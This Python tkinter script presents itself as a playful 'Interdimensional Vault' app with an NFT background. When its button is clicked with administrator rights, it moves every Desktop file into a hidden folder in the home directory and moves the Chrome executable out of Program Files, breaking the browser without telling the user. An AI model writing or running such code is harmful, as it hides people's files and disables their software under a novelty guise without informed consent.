import os
import shutil
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import logging
from datetime import datetime
import ctypes

# Set up logging
logging.basicConfig(filename='interdimensional_vault.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def move_folder_contents_to_interdimensional_vault(source_path, vault_folder_path):
    try:
        # Move all contents from the source directory to the vault folder
        for root, dirs, files in os.walk(source_path):
            for item in files:
                item_path = os.path.join(root, item)
                try:
                    shutil.move(item_path, vault_folder_path)
                    logging.info(f'Moved {item_path} to {vault_folder_path}')
                except Exception as e:
                    logging.error(f'Failed to move {item_path}: {e}')

        messagebox.showinfo("Success", "All contents have been moved to the Interdimensional Vault.")
    except Exception as e:
        logging.error(f'An error occurred: {e}')
        messagebox.showerror("Error", f"An error occurred: {e}")

def create_gui():
    root = tk.Tk()
    root.title("Interdimensional Vault")
    root.geometry('300x300')
    root.resizable(False, False)

    # Load the background image
    image_path = 'itsageodeNFT.png'  # Change this to the correct path of your image
    image = Image.open(image_path)
    image = image.resize((300, 300), Image.LANCZOS)  # Resize to a 300x300 square
    bg_image = ImageTk.PhotoImage(image)

    # Create a canvas and set the background image
    canvas = tk.Canvas(root, width=300, height=300)
    canvas.pack(fill="both", expand=True)
    canvas.create_image(0, 0, image=bg_image, anchor="nw")

    def on_move_button_click():
        # Get the path to the desktop
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        hidden_folder_name = '.hidden_interdimensional_vault'
        hidden_folder_path = os.path.join(os.path.expanduser('~'), hidden_folder_name)

        # Check if user has administrative rights
        if is_admin():
            move_folder_contents_to_interdimensional_vault(desktop_path, hidden_folder_path)
            # Example: Move Chrome application
            chrome_exe = r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
            if os.path.exists(chrome_exe):
                try:
                    shutil.move(chrome_exe, hidden_folder_path)
                    logging.info(f'Moved {chrome_exe} to {hidden_folder_path}')
                except Exception as e:
                    logging.error(f'Failed to move {chrome_exe}: {e}')
        else:
            messagebox.showerror("Permission Error", "Administrator rights required. Please run the application as administrator.")

    # Set UCSD colors for buttons
    UCSD_GOLD = '#FFD700'
    UCSD_BLUE = '#003B5C'

    # Create a button and place it at the bottom right corner
    move_button = tk.Button(root, text="Activate Vault", command=on_move_button_click,
                            bg=UCSD_BLUE, fg="white", padx=10)
    move_button_window = canvas.create_window(290, 290, anchor="se", window=move_button)

    root.mainloop()

if __name__ == '__main__':
    create_gui()
